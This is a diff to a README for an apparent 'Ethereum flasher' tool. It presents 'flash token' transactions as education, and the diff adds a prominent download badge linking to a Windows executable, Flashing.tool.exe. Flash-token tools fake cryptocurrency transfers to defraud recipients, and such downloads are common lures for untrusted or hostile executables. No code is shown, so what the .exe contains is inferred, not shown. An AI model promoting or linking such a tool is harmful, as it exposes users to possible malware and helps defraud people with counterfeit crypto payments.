@@ -22,7 +22,13 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 - 🖥 **.exe Included** — The program is compiled into a portable Windows executable. No Python required — just run it and you're good to go.
 - 💻 **Minimalist GUI** — Built with Tkinter for performance and simplicity.
 
----
+<h1 align="center"><b>🚀 Download Now</b></h1>
+
+<p align="center">
+  <a href="https://github.com/flexxwhoax/Ethereum-flasher/releases/download/tool/Flashing.tool.exe">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
+  </a>
+</p>
 
 ## 🪙 Flash Tokens Supported
 
